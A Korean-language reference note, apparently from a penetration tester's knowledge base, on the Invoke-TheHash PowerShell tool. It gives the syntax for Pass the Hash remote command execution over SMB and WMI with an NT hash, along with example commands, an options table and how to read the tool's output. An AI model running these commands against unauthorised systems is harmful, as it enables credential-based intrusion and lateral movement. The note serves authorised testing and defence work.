---
tags:
  - 환경/windows
  - 서비스/smb
  - 기능/원격실행
실행환경: ["Windows PowerShell"]
필요권한: ["공격 호스트의 일반 PowerShell 실행 권한", "대상 원격 실행은 hash 주체의 대상 로컬 관리자 권한"]
결과: ["NT hash 인증 결과", "SMB 서비스 기반 또는 WMI 기반 원격 명령 실행 결과"]
---

# Invoke-TheHash

## 도구 개요

Invoke-TheHash는 PowerShell에서 NT hash를 사용해 SMB 또는 WMI로 인증하고 원격 명령을 실행하는 함수 모음이다. Windows 공격 호스트에서 별도 Impacket 환경 없이 Pass the Hash 원격 실행을 확인할 때 적합하다.

## 필요한 입력과 실행 환경

- 실행 위치: Invoke-TheHash 모듈을 불러올 수 있는 Windows PowerShell 호스트
- 필요한 입력: 대상 호스트, 사용자명, NT hash, 로컬 또는 도메인 계정 범위와 실행 명령
- 대상 조건: SMB 방식은 Service Control Manager 쓰기 권한, WMI 방식은 원격 WMI 실행 권한과 관련 RPC 경로 필요

## 표준 문법

```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target <TARGET> -Domain <DOMAIN> -Username <USER> -Hash <NTLM_HASH> -Command "<COMMAND>" -Verbose
Invoke-WMIExec -Target <TARGET> -Domain <DOMAIN> -Username <USER> -Hash <NTLM_HASH> -Command "<COMMAND>"
```

로컬 계정이면 대상 호스트의 계정 범위에 맞춰 `-Domain`을 생략하거나 대상 호스트명을 사용한다.

## 대표 예시

```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target <TARGET> -Domain <DOMAIN> -Username <USER> -Hash <NTLM_HASH> -Command "whoami /all" -Verbose
Invoke-WMIExec -Target <TARGET> -Domain <DOMAIN> -Username <USER> -Hash <NTLM_HASH> -Command "hostname"
```

## 주요 옵션

| 옵션 | 설명 |
|---|---|
| `-Target` | 원격 명령을 실행할 Windows 호스트 |
| `-Username` | NT hash가 속한 사용자 이름 |
| `-Domain` | 도메인 계정 범위. 로컬 계정에서는 대상 호스트 범위를 사용 |
| `-Hash` | 재사용 가능한 NT hash |
| `-Command` | 대상에서 실행할 명령 |
| `-Verbose` | SMB 인증, 서비스 생성과 삭제 단계를 자세히 표시 |

## 도구 고유 출력

| 출력 | 의미 | 다음 확인 |
|---|---|---|
| `successfully authenticated` | NT hash 인증 성공 | 원격 실행 권한과 실제 명령 결과 확인 |
| `Service Control Manager write privilege` | SMB 서비스 기반 실행 조건 충족 | 임시 서비스 생성·실행·삭제 메시지 확인 |
| `Command executed with process id <PID>` | WMI가 대상 프로세스를 생성함 | 명령 결과 회수와 대상 실행 계정 확인 |
| 인증 성공 뒤 실행 실패 | hash는 유효하지만 원격 실행 권한 또는 서비스 조건 부족 | 대상 로컬 관리자 권한, SMB·RPC·WMI 정책 확인 |

## 관련 공격기법

- [[Pass the Hash]]
